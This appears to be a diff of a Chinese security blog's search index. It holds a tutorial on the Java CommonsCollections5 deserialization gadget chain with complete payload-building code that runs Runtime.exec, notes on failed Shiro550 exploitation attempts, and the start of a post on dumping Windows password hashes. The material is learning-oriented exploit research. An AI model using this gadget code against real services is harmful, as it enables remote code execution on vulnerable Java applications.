Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Requires:</span></span><br><span class="line"><span class="comment">		commons-collections</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
+
+<p>这里重点看**BadAttributeValueExpException.readObject()<strong>和</strong>TiedMapEntry.toString()**，其他的都和前面两章一样 <a href="https://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247484514&idx=1&sn=2552ec324c1395c9c3c8b9f78cbb4908&chksm=c2829d7bf5f5146d1d2dd0531344262a31b44f27d8c56c7465a9d0555c8773bc096424a0dd53&scene=0&xtrack=1#rd">Java ysoserial学习之CommonsCollections1(二)</a>、<a href="https://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247484560&idx=1&sn=8a997456a5ccc09a4c11208e92c31093&chksm=c2829d89f5f5149f8000c1070e28eaf3049847b41e1377bf68f1074f7163ee7071eb61c84695&scene=0&xtrack=1#rd">Java ysoserial学习之CommonsCollections6(三)</a></p>
+<h3 id="1-1-TiedMapEntry-toString"><a href="#1-1-TiedMapEntry-toString" class="headerlink" title="1.1 TiedMapEntry.toString()"></a>1.1 TiedMapEntry.toString()</h3><p>上一节说过解决<strong>Java高版本利用</strong>问题，实际上就是在找是否还有其他调用 <strong>LazyMap#get()</strong> 的地方，因为<strong>LazyMap</strong>对象是只要执行<strong>get</strong>方法就会调用<strong>transform</strong>，而<strong>transform</strong>的特性是可以执行任意方法。</p>
+<p>CC6中是在<strong>TiedMapEntry</strong>类中找到了<strong>hashCode</strong>方法中调用了<strong>map.get(key);</strong>,并且<strong>map</strong>是我们可控的<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701204945.png" alt="image-20210630213657788"></p>
+<p>而CC5中则是利用了<strong>TiedMapEntry#toString</strong>方法<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701204954.png" alt="image-20210630212357694"></p>
+<p>还是先实验一下，确定可以<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701205000.png" alt="image-20210630214320487"></p>
+<p>但这还不够好，我们希望的是目标反序列化后直接触发命令的执行，因此我们需要找到一个类在反序列化后会直接触发 <strong>TiedMapEntry#toString</strong> 从而触发命令的执行。</p>
+<h3 id="1-2-BadAttributeValueExpException-readObject"><a href="#1-2-BadAttributeValueExpException-readObject" class="headerlink" title="1.2 BadAttributeValueExpException.readObject()"></a>1.2 BadAttributeValueExpException.readObject()</h3><p>在ysoserial中是利用了 <strong>rt.jar!&#x2F;javax&#x2F;management&#x2F;BadAttributeValueExpException.class#readObject</strong>方法来达到上述目的<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701205412.png" alt="image-20210630214951419"></p>
+<blockquote>
+<p>这里我们可以看到<strong>BadAttributeValueExpException</strong>并没有实现<strong>Serializable</strong>接口,为什么可以序列化？<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701205417.png" alt="image-20210701200642699"></p>
+<p>其实是<strong>BadAttributeValueExpException</strong>继承了<strong>Exception</strong>，<strong>Exception</strong>又继承了<strong>Throwable</strong>，<strong>Throwable</strong>实现了<strong>Serializable</strong>接口<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701205421.png" alt="image-20210701200756489"></p>
+</blockquote>
+<p>在<strong>BadAttributeValueExpException#readObject</strong>中发现<strong>get</strong>函数获取<strong>val</strong>的值然后赋给<strong>valObj</strong>，然后在符合<strong>第二个else if</strong>的情况下就会调用<strong>toString</strong>, 巧的是 <strong>System.getSecurityManager()</strong> 返回值默认为<strong>null</strong><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701205426.png" alt="image-20210701201112074"></p>
+<p>这样就只需要可以控制<strong>val</strong>的值就可以执行命令了。</p>
+<p>然后我们发现在构造函数中就可以控制<strong>val</strong>的值，可以直接将<strong>tiedMapEntry</strong>作为参数传进去。</p>
+<p><strong>注意</strong>:在构造函数中我们可以看到，当传入一个<strong>val</strong>，<strong>val</strong>就不等于<strong>null</strong>，会调用一次<strong>toString()<strong>方法,也就是说，创建</strong>BadAttributeValueExpException</strong>对象时会弹出一次计算器，而在我们的构想中，反序列化时也会弹出一次，总共是<strong>两</strong>次。<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701205431.png" alt="image-20210630220727451"></p>
+<p>实验一下<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701205435.png" alt="image-20210630221313347"></p>
+<p>但是，最终发现只弹了一次计算器，也就是说在反序列化时并没有执行<strong>toString</strong>方法，进而执行命令。</p>
+<p>直接在<strong>BadAttributeValueExpException#readObject</strong>下断点Debug一下,会发现这时<strong>valObj</strong>是一个字符串了，直接进入了<strong>第一个 else if <strong>判断中，并没有进入</strong>第二个 else if <strong>，这是因为在创建</strong>BadAttributeValueExpException</strong>对象时，<strong>val</strong>已经执行过了一次<strong>toString</strong>方法，变成了字符串，所以匹配到了**第一个 else if **判断<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701205443.png" alt="image-20210630221828997"></p>
+<p>要想改变<strong>val</strong>的值就需要用到前面反复提到的<strong>反射</strong>了</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 利用反射修改 BadAttributeValueExpException 中的 val 为 tiedMapEntry</span></span><br><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">bad</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> bad.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">val.set(bad, tiedMapEntry);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701205451.png" alt="image-20210701204112054"></p>
+<p>完整代码</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/6/30 21:05</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	Gadget chain:</span></span><br><span class="line"><span class="comment">        ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            BadAttributeValueExpException.readObject()</span></span><br><span class="line"><span class="comment">                TiedMapEntry.toString()</span></span><br><span class="line"><span class="comment">                    LazyMap.get()</span></span><br><span class="line"><span class="comment">                        ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                            ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Class.getMethod()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Requires:</span></span><br><span class="line"><span class="comment">		commons-collections</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">This only works in JDK 8u76 and WITHOUT a security manager</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>), <span class="comment">// 隐藏错误信息</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//使用 LazyMap</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;yhy&quot;</span>);</span><br><span class="line"><span class="comment">//        tiedMapEntry.toString();</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 利用反射修改 BadAttributeValueExpException 中的 val 为 tiedMapEntry</span></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">bad</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> bad.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(bad, tiedMapEntry);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        // 序列化</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(bad);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化读取 out.bin 文件</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x02-参考"><a href="#0x02-参考" class="headerlink" title="0x02 参考"></a>0x02 参考</h2><p>天下大木头师傅的 <a href="https://www.yuque.com/tianxiadamutou/zcfd4v/ac9529#55fcdbc0">https://www.yuque.com/tianxiadamutou/zcfd4v/ac9529#55fcdbc0</a></p>
 ]]></content>
       <categories>
         <category>漏洞原理</category>
@@ -659,48 +659,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Java反序列化漏洞分析(二)-Shiro550</title>
-    <url>/2021/05/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(%E4%BA%8C)-Shiro550/</url>
-    <content><![CDATA[<blockquote>
-<p>  这是一篇失败的文章，要学的东西太多了，高看我自己了。终究是纸上得来终觉浅，绝知此事要躬行</p>
-</blockquote>
-<h2 id="0x00-纠错"><a href="#0x00-纠错" class="headerlink" title="0x00 纠错"></a>0x00 纠错</h2><p>首先纠正一下上篇文章<a href="">Java反序列化漏洞分析(一)-Shiro550</a>的错误错误，上篇提到dnslog使用原生环境搭建没有打成功，这是<strong>错的</strong>、<strong>错的</strong>、<strong>错的</strong>，其实是可以打的。我给搞错了，<strong>URLDNS</strong> 这个利用链本身不依赖于任何第三方库，同时不限制jdk的版本，所以通常是用来检测反序列化的点（目标出网），我当时没打成功，是因为我做实验时，用了<strong>同一条</strong>dnslog的url打过一遍，第二遍死活不出结果，写这篇文章时又测了几次，发现是url的锅，要不停的变换才会一直出结果<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210524215703.png" alt="原生的shiro550可以使用dnslog探测"></p>
-<blockquote>
-<p>  Java默认有TTL缓存，DNS解析会进行缓存，所以可能会出现第一次收到DNS的log，后面可能收不到的情况。</p>
-</blockquote>
-<h2 id="0x01-原生Shiro550执行命令"><a href="#0x01-原生Shiro550执行命令" class="headerlink" title="0x01 原生Shiro550执行命令"></a>0x01 原生Shiro550执行命令</h2><p>当使用<strong>URLDNS链</strong>打过去，在DNSLOG平台有回显的时候，就说明这个地方存在反序列化漏洞。</p>
-<p>但是要利用的话还得是使用CC链等利用链去进行命令的执行（shiro550中自带的是cc3.2.1版本的组件）。</p>
-<p>经过测试<strong>ysoserial</strong>拥有的CommonsCollections利用链从1-7都无法成功执行命令, 都是报错<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210529211912.png" alt="image-20210528211554019"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210529211926.png" alt="image-20210525211529910"></p>
-<p>无法反序列化一个数组，经常敲代码，修bug的都知道，报错的位置一般都在最下边的，去看看</p>
-<p><code>at org.apache.shiro.io.DefaultSerializer.deserialize(DefaultSerializer.java:77)</code> 直接点过去看看<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210529211917.png" alt="image-20210526220345069"></p>
-<p>可以看到在<a href="">初探Java反序列化漏洞(一)</a>中提到的重点函数<strong>readObject()<strong>函数，但是又有一点点不一样，它这里是</strong>new</strong>了一个<strong>ClassResolvingObjectInputStream</strong>,而非传统的<strong>ObjectInputStream</strong> 问题就可能出现在这里，全局搜索看下<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210529211939.png" alt="image-20210526220837880"></p>
-<p>这里是通过 <strong>ClassUtils.forName(osc.getName());<strong>来反射调用的，而前面都是通过</strong>Class.forName(“java.lang.Runtime”);</strong> 来进行反射执行命令的<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210529211949.png" alt="image-20210526221020003"></p>
-<p>直接在这里下断点，然后使用CC2链打一下，调试半天也没看懂，太菜了，先记下 参考文章中说的是</p>
-<blockquote>
-<p>  Shiro resovleClass 使用的是ClassLoader.loadClass()而非Class.forName()，而ClassLoader.loadClass不支持装载数组类型的class。</p>
-</blockquote>
-<p>别人在环境中引入了<code>commons-collections4.0</code>，使得ysoserial的<code>CommonsCollections2</code>利用链可以成功利用。这是因为<code>CommonsCollections2</code>用的是非数组形式的利用链，在该利用链上没有出现数组类型的对象，这使得在shiro的环境下，可以正确执行命令。（后续学习这条链）</p>
-<h2 id="0x01-构造新的利用链"><a href="#0x01-构造新的利用链" class="headerlink" title="0x01 构造新的利用链"></a>0x01 构造新的利用链</h2><p>我不会。。。 看半天还是没看懂，前置知识缺的有点多，直接放链接吧</p>
-<p><a href="https://www.anquanke.com/post/id/192619#h2-3">https://www.anquanke.com/post/id/192619#h2-3</a> </p>
-<p>总结就是利用链中的<code>ChainedTransformer</code>这个类的利用是无法成功的，因为它的类属性<code>iTransformers</code>是数组类型的<code>Transformers</code>，最终通过使用<code>TemplatesImpl.newTransformer</code>函数来动态<code>loadClass</code>构造好的evil class bytes</p>
-<p>通过大佬改造的<a href="https://github.com/wh1t3p1g/ysoserial">https://github.com/wh1t3p1g/ysoserial</a> CommonsCollections10 利用链打一下<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210529212125.png" alt="image-20210527084745187"></p>
-<p>这个图<strong>又是假</strong>的，淦，用大佬的CC10链打了之后，突然怀疑之前的命令搞错了，我之前是用<code>whoami</code>测试的，我想起了mac命令执行不太一样，重新用<code>open -a Calculator</code>试了一遍，发现CC2链又可以成功了，瞬间凌乱（已经把添加的commons-collections4.0版本给注释了），这两天一直在重新测试找原因，通过重新下载shiro，切换版本重新来一遍，CC2并不可以打原生的shiro550，用大佬的CC10也打不出来，原因也找不到，前置知识缺的太多了，再搞下去也是浪费时间。</p>
-<p>最终找到我为啥可以打成功，因为我在<code>shiro/samples/web</code>目录下生成过war包，当时是在测试4.0版本RCE，生成的target目录没有删除，之后启动的时候应该都是使用target目录下的东西，即使去除4.0版本依旧没用，生成的war包并没有改变还是可以RCE的4.0版本，搞得我怀疑人生。还有说<strong>JRMP</strong> 这个<strong>Gadget</strong>可以打，也是废了，没成功。</p>
-<p>不搞了，心累，等补充完知识，再重新来吧</p>
-<p>接下来通过<a href="https://github.com/frohoff/ysoserial%E8%BF%99%E4%B8%AA%E9%A1%B9%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE%E5%90%A7%EF%BC%8C%E6%85%A2%E6%85%A2%E6%9D%A5%E5%90%A7%E3%80%82">https://github.com/frohoff/ysoserial这个项目来学习java反序列化的利用链吧，慢慢来吧。</a></p>
-<h2 id="0x02-参考"><a href="#0x02-参考" class="headerlink" title="0x02 参考"></a>0x02 参考</h2><p>推荐一个Chrome插件—<strong>Toby for Chrome</strong>，适合舍不得关标签页，留待后续研究的。</p>
-<p>中途参考的文章太多了，就用这个插件生成的分享链接吧</p>
-<p><a href="https://www.gettoby.com/p/m9955hzbsf6s">https://www.gettoby.com/p/m9955hzbsf6s</a></p>
-]]></content>
-      <categories>
-        <category>漏洞原理</category>
-      </categories>
-      <tags>
-        <tag>漏洞原理</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Java反序列化漏洞分析(一)-Shiro550</title>
     <url>/2021/05/21/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(%E4%B8%80)-Shiro550/</url>
     <content><![CDATA[<blockquote>
@@ -808,6 +766,48 @@
       </tags>
   </entry>
   <entry>
+    <title>Java反序列化漏洞分析(二)-Shiro550</title>
+    <url>/2021/05/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(%E4%BA%8C)-Shiro550/</url>
+    <content><![CDATA[<blockquote>
+<p>  这是一篇失败的文章，要学的东西太多了，高看我自己了。终究是纸上得来终觉浅，绝知此事要躬行</p>
+</blockquote>
+<h2 id="0x00-纠错"><a href="#0x00-纠错" class="headerlink" title="0x00 纠错"></a>0x00 纠错</h2><p>首先纠正一下上篇文章<a href="">Java反序列化漏洞分析(一)-Shiro550</a>的错误错误，上篇提到dnslog使用原生环境搭建没有打成功，这是<strong>错的</strong>、<strong>错的</strong>、<strong>错的</strong>，其实是可以打的。我给搞错了，<strong>URLDNS</strong> 这个利用链本身不依赖于任何第三方库，同时不限制jdk的版本，所以通常是用来检测反序列化的点（目标出网），我当时没打成功，是因为我做实验时，用了<strong>同一条</strong>dnslog的url打过一遍，第二遍死活不出结果，写这篇文章时又测了几次，发现是url的锅，要不停的变换才会一直出结果<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210524215703.png" alt="原生的shiro550可以使用dnslog探测"></p>
+<blockquote>
+<p>  Java默认有TTL缓存，DNS解析会进行缓存，所以可能会出现第一次收到DNS的log，后面可能收不到的情况。</p>
+</blockquote>
+<h2 id="0x01-原生Shiro550执行命令"><a href="#0x01-原生Shiro550执行命令" class="headerlink" title="0x01 原生Shiro550执行命令"></a>0x01 原生Shiro550执行命令</h2><p>当使用<strong>URLDNS链</strong>打过去，在DNSLOG平台有回显的时候，就说明这个地方存在反序列化漏洞。</p>
+<p>但是要利用的话还得是使用CC链等利用链去进行命令的执行（shiro550中自带的是cc3.2.1版本的组件）。</p>
+<p>经过测试<strong>ysoserial</strong>拥有的CommonsCollections利用链从1-7都无法成功执行命令, 都是报错<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210529211912.png" alt="image-20210528211554019"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210529211926.png" alt="image-20210525211529910"></p>
+<p>无法反序列化一个数组，经常敲代码，修bug的都知道，报错的位置一般都在最下边的，去看看</p>
+<p><code>at org.apache.shiro.io.DefaultSerializer.deserialize(DefaultSerializer.java:77)</code> 直接点过去看看<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210529211917.png" alt="image-20210526220345069"></p>
+<p>可以看到在<a href="">初探Java反序列化漏洞(一)</a>中提到的重点函数<strong>readObject()<strong>函数，但是又有一点点不一样，它这里是</strong>new</strong>了一个<strong>ClassResolvingObjectInputStream</strong>,而非传统的<strong>ObjectInputStream</strong> 问题就可能出现在这里，全局搜索看下<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210529211939.png" alt="image-20210526220837880"></p>
+<p>这里是通过 <strong>ClassUtils.forName(osc.getName());<strong>来反射调用的，而前面都是通过</strong>Class.forName(“java.lang.Runtime”);</strong> 来进行反射执行命令的<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210529211949.png" alt="image-20210526221020003"></p>
+<p>直接在这里下断点，然后使用CC2链打一下，调试半天也没看懂，太菜了，先记下 参考文章中说的是</p>
+<blockquote>
+<p>  Shiro resovleClass 使用的是ClassLoader.loadClass()而非Class.forName()，而ClassLoader.loadClass不支持装载数组类型的class。</p>
+</blockquote>
+<p>别人在环境中引入了<code>commons-collections4.0</code>，使得ysoserial的<code>CommonsCollections2</code>利用链可以成功利用。这是因为<code>CommonsCollections2</code>用的是非数组形式的利用链，在该利用链上没有出现数组类型的对象，这使得在shiro的环境下，可以正确执行命令。（后续学习这条链）</p>
+<h2 id="0x01-构造新的利用链"><a href="#0x01-构造新的利用链" class="headerlink" title="0x01 构造新的利用链"></a>0x01 构造新的利用链</h2><p>我不会。。。 看半天还是没看懂，前置知识缺的有点多，直接放链接吧</p>
+<p><a href="https://www.anquanke.com/post/id/192619#h2-3">https://www.anquanke.com/post/id/192619#h2-3</a> </p>
+<p>总结就是利用链中的<code>ChainedTransformer</code>这个类的利用是无法成功的，因为它的类属性<code>iTransformers</code>是数组类型的<code>Transformers</code>，最终通过使用<code>TemplatesImpl.newTransformer</code>函数来动态<code>loadClass</code>构造好的evil class bytes</p>
+<p>通过大佬改造的<a href="https://github.com/wh1t3p1g/ysoserial">https://github.com/wh1t3p1g/ysoserial</a> CommonsCollections10 利用链打一下<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210529212125.png" alt="image-20210527084745187"></p>
+<p>这个图<strong>又是假</strong>的，淦，用大佬的CC10链打了之后，突然怀疑之前的命令搞错了，我之前是用<code>whoami</code>测试的，我想起了mac命令执行不太一样，重新用<code>open -a Calculator</code>试了一遍，发现CC2链又可以成功了，瞬间凌乱（已经把添加的commons-collections4.0版本给注释了），这两天一直在重新测试找原因，通过重新下载shiro，切换版本重新来一遍，CC2并不可以打原生的shiro550，用大佬的CC10也打不出来，原因也找不到，前置知识缺的太多了，再搞下去也是浪费时间。</p>
+<p>最终找到我为啥可以打成功，因为我在<code>shiro/samples/web</code>目录下生成过war包，当时是在测试4.0版本RCE，生成的target目录没有删除，之后启动的时候应该都是使用target目录下的东西，即使去除4.0版本依旧没用，生成的war包并没有改变还是可以RCE的4.0版本，搞得我怀疑人生。还有说<strong>JRMP</strong> 这个<strong>Gadget</strong>可以打，也是废了，没成功。</p>
+<p>不搞了，心累，等补充完知识，再重新来吧</p>
+<p>接下来通过<a href="https://github.com/frohoff/ysoserial%E8%BF%99%E4%B8%AA%E9%A1%B9%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE%E5%90%A7%EF%BC%8C%E6%85%A2%E6%85%A2%E6%9D%A5%E5%90%A7%E3%80%82">https://github.com/frohoff/ysoserial这个项目来学习java反序列化的利用链吧，慢慢来吧。</a></p>
+<h2 id="0x02-参考"><a href="#0x02-参考" class="headerlink" title="0x02 参考"></a>0x02 参考</h2><p>推荐一个Chrome插件—<strong>Toby for Chrome</strong>，适合舍不得关标签页，留待后续研究的。</p>
+<p>中途参考的文章太多了，就用这个插件生成的分享链接吧</p>
+<p><a href="https://www.gettoby.com/p/m9955hzbsf6s">https://www.gettoby.com/p/m9955hzbsf6s</a></p>
+]]></content>
+      <categories>
+        <category>漏洞原理</category>
+      </categories>
+      <tags>
+        <tag>漏洞原理</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SScan  一款src捡洞扫描器</title>
     <url>/2021/01/11/SScan/</url>
     <content><![CDATA[<h2 id="SScan"><a href="#SScan" class="headerlink" title="SScan"></a>SScan</h2><p><a href="https://github.com/yhy0/SScan/"><img src="https://img.shields.io/badge/python-3.6|3.7|3.8-blue" alt="python"></a></p>
@@ -901,6 +901,90 @@
       </categories>
       <tags>
         <tag>GitHub工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows系统散列值获取</title>
+    <url>/2021/02/07/Windows%E7%B3%BB%E7%BB%9F%E6%95%A3%E5%88%97%E5%80%BC%E8%8E%B7%E5%8F%96/</url>
+    <content><![CDATA[<blockquote>
+<p>  明年今日，人生一大喜事(≧∇≦)ﾉ  弱弱问一句我很胖吗？183 165</p>
+</blockquote>
+<h1 id="Windows系统散列值获取"><a href="#Windows系统散列值获取" class="headerlink" title="Windows系统散列值获取"></a>Windows系统散列值获取</h1><h2 id="0x01-LM-Hash与NTLM-Hash"><a href="#0x01-LM-Hash与NTLM-Hash" class="headerlink" title="0x01 LM Hash与NTLM Hash"></a>0x01 LM Hash与NTLM Hash</h2><p>Windows操作系统通常使用两种方法对用户的明文密码进行加密处理。在域环境中，用户信息存储在<code>ntds.dit</code>中，加密后为散列值。</p>
+<p>Windows操作系统中的密码一般由两部分组成，一部分为LM Hash，另一部分为NTLM Hash。在Windows操作系统中，Hash的结构通常如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username:RID:LM-HASH:NT-HASH</span><br></pre></td></tr></table></figure>
+
+<blockquote>
